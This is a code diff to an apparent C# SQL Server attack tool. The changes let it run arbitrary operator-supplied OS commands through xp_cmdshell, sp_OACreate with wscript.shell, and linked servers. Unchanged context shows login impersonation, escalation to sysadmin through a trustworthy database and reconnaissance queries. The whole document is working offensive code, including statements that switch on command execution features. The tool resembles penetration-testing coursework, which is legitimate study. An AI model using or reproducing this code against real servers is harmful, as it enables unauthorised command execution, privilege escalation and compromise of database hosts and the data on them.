@@ -8,11 +8,19 @@ namespace SQLServerEx
         public static void Impersonate(SqlConnection con, String impersUser)
         {
             Console.WriteLine("Executing command as " + impersUser);
-            String impersonateUser = "EXECUTE AS LOGIN = '" + impersUser + "';";
+            try
+            {
+                String impersonateUser = "EXECUTE AS LOGIN = '" + impersUser + "';";
 
-            SqlCommand command = new SqlCommand(impersonateUser, con);
-            SqlDataReader reader = command.ExecuteReader();
-            reader.Close();
+                SqlCommand command = new SqlCommand(impersonateUser, con);
+                SqlDataReader reader = command.ExecuteReader();
+                reader.Close();
+            }
+            catch
+            {
+                Console.WriteLine("[-] Not possible to impersonate specified user");
+                System.Environment.Exit(1);
+            }
         }
 
         public static void DBownerEsc(SqlConnection con, String owneddb)
@@ -36,10 +44,18 @@ namespace SQLServerEx
             String username = reader[0].ToString();
             reader.Close();
 
-            execCmd = "CREATE PROCEDURE sp_elevate WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember '" + username + "','sysadmin'";
-            command = new SqlCommand(execCmd, con);
-            reader = command.ExecuteReader();
-            reader.Close();
+            try
+            {
+                execCmd = "CREATE PROCEDURE sp_elevate WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember '" + username + "','sysadmin'";
+                command = new SqlCommand(execCmd, con);
+                reader = command.ExecuteReader();
+                reader.Close();
+            }
+            catch
+            {
+                Console.WriteLine("[-] CREATE PROCEDURE permission denied in provided database");
+                return;
+            }
 
             execCmd = "EXEC sp_elevate;SELECT is_srvrolemember('sysadmin')";
             command = new SqlCommand(execCmd, con);
@@ -57,12 +73,12 @@ namespace SQLServerEx
             reader.Close();
         }
 
-        public static void Xp_cmdshell(SqlConnection con, String impersUser)
+        public static void Xp_cmdshell(SqlConnection con, String impersUser, String exec)
         {
             Impersonate(con, impersUser);
 
             String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
-            String execCmd = "EXEC xp_cmdshell whoami";
+            String execCmd = "EXEC('xp_cmdshell ''" + exec + "''')";
 
             SqlCommand command = new SqlCommand(enable_xpcmd, con);
             SqlDataReader reader = command.ExecuteReader();
@@ -75,12 +91,12 @@ namespace SQLServerEx
             reader.Close();
         }
 
-        public static void sp_OACreate(SqlConnection con, String impersUser)
+        public static void sp_OACreate(SqlConnection con, String impersUser, String exec)
         {
             Impersonate(con, impersUser);
 
             String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; ";
-            String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Tools\\file.txt\"';";
+            String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '" + exec +"';";
 
             SqlCommand command = new SqlCommand(enable_ole, con);
             SqlDataReader reader = command.ExecuteReader();
@@ -141,7 +157,7 @@ namespace SQLServerEx
             reader.Close();
         }
 
-        public static void RunLink(SqlConnection con, String link)
+        public static void RunLink(SqlConnection con, String link, String exec)
         {
             String LinkedServer = link;
             Console.WriteLine("Connecting to the linked server: " + LinkedServer);
@@ -164,10 +180,17 @@ namespace SQLServerEx
             reader.Close();
             */
 
-            String enablerpcout = "EXEC sp_serveroption '" + LinkedServer + "', 'rpc out', true;";
-            command = new SqlCommand(enablerpcout, con);
-            reader = command.ExecuteReader();
-            reader.Close();
+            try
+            {
+                String enablerpcout = "EXEC sp_serveroption '" + LinkedServer + "', 'rpc out', true;";
+                command = new SqlCommand(enablerpcout, con);
+                reader = command.ExecuteReader();
+                reader.Close();
+            }
+            catch
+            {
+                Console.WriteLine("[-] Can't enable RPC out. Proceeding without it.");
+            }
 
             execCmd = "EXEC ('sp_linkedservers') AT \"" + LinkedServer + "\"";
             command = new SqlCommand(execCmd, con);
@@ -178,23 +201,32 @@ namespace SQLServerEx
             }
             reader.Close();
 
-            // Execute powershell code on the linked server
+            try
+            {
+                String enableadvoptions = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT \"" + LinkedServer + "\"";
+                String enablexpcmdshell = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT \"" + LinkedServer + "\"";
 
-            String enableadvoptions = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT \"" + LinkedServer + "\"";
-            String enablexpcmdshell = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT \"" + LinkedServer + "\"";
-            execCmd = "EXEC ('xp_cmdshell ''powershell -enc ZQBjAGgAbwAgADEAMgAzACAAPgAgAGMAOgBcAHQAbwBvAGwAcwBcADEAMgAzAC4AdAB4AHQACgA=''') AT \"" + LinkedServer + "\"";
+                command = new SqlCommand(enableadvoptions, con);
+                reader = command.ExecuteReader();
+                reader.Close();
 
-            command = new SqlCommand(enableadvoptions, con);
-            reader = command.ExecuteReader();
-            reader.Close();
+                command = new SqlCommand(enablexpcmdshell, con);
+                reader = command.ExecuteReader();
+                reader.Close();
+            }
+            catch
+            {
+                Console.WriteLine("[-] xp_cmdshell enabling failed");
+                return;
+            }
 
-            command = new SqlCommand(enablexpcmdshell, con);
-            reader = command.ExecuteReader();
-            reader.Close();
+            // Execute command on the linked server   
+   
+                execCmd = "EXEC ('xp_cmdshell ''" + exec + "''') AT \"" + LinkedServer + "\"";
 
-            command = new SqlCommand(execCmd, con);
-            reader = command.ExecuteReader();
-            reader.Close();
+                command = new SqlCommand(execCmd, con);
+                reader = command.ExecuteReader();
+                reader.Close();
         }
 
         public static void Recon(SqlConnection con)
@@ -217,7 +249,7 @@ namespace SQLServerEx
             }
             else
             {
-                Console.WriteLine("User is NOT a member of public role");
+                Console.WriteLine("[-] User is NOT a member of public role");
             }
             reader.Close();
 
@@ -228,7 +260,7 @@ namespace SQLServerEx
             role = Int32.Parse(reader[0].ToString());
             if (role == 1)
             {
-                Console.WriteLine("User is a member of sysadmin role");
+                Console.WriteLine("[+] User is a member of sysadmin role");
             }
             else
             {
@@ -256,7 +288,7 @@ namespace SQLServerEx
             }
             reader.Close();
 
-            execCmd = "SELECT d.name AS DATABASENAME FROM sys.server_principals r INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id INNER JOIN sys.server_principals p ON p.principal_id = m.member_principal_id inner join sys.databases d on suser_sname(d.owner_sid) = p.name WHERE is_trustworthy_on = 1 AND d.name NOT IN('MSDB') and r.type = 'R' and r.name = N'sysadmin'";
+            execCmd = "SELECT a.name FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name = b.name WHERE is_trustworthy_on = 1";
             command = new SqlCommand(execCmd, con);
             reader = command.ExecuteReader();
             while (reader.Read())
@@ -283,6 +315,7 @@ namespace SQLServerEx
             string impersUser = a.GetValue("i", "impers");
             string exploit = a.GetValue("e", "exploit");
             string owneddb = a.GetValue("o", "odb");
+            string exec = a.GetValue("c", "command");
 
             if (string.IsNullOrWhiteSpace(sqlServer))
                 sqlServer = Program.Prompt("sqlServer");
@@ -353,7 +386,7 @@ namespace SQLServerEx
                     case "link":
                         // Requires -l to be set to target linked server
 
-                        RunLink(con, linkSrv);
+                        RunLink(con, linkSrv, exec);
                         break;
 
                     case "relay":
@@ -365,11 +398,11 @@ namespace SQLServerEx
                     case "sp":
                         // Provide the user to impersonate, otherwise will try sa.
 
-                        sp_OACreate(con, impersUser);
+                        sp_OACreate(con, impersUser, exec);
                         break;
 
                     case "xpshell":
-                        Xp_cmdshell(con, impersUser);
+                        Xp_cmdshell(con, impersUser, exec);
                         break;
 
                     case "rundll":
